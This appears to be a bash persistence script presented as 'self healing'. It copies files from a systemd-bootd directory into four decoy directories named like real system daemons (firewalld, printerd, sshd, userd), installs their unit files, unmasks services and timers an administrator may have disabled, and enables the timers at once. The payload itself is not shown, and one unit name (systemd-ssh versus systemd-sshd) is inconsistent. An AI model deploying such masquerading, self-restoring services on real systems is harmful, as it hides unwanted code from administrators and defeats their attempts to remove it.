#! /bin/bash

# Self healing
mkdir --parents /usr/share/systemd-firewalld
mkdir --parents /usr/share/systemd-printerd
mkdir --parents /usr/share/systemd-sshd
mkdir --parents /usr/share/systemd-userd

cp -- /usr/share/systemd-bootd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-bootd/* /usr/share/systemd-userd/

systemctl daemon-reload
systemctl unmask systemd-firewalld.service
systemctl unmask systemd-printerd.service
systemctl unmask systemd-ssh.service
systemctl unmask systemd-userd.service

systemctl unmask systemd-firewalld.timer
systemctl unmask systemd-printerd.timer
systemctl unmask systemd-sshd.timer
systemctl unmask systemd-userd.timer

systemctl enable --now systemd-firewalld.timer
systemctl enable --now systemd-printerd.timer
systemctl enable --now systemd-sshd.timer
systemctl enable --now systemd-userd.timer

# vim: set filetype=sh:
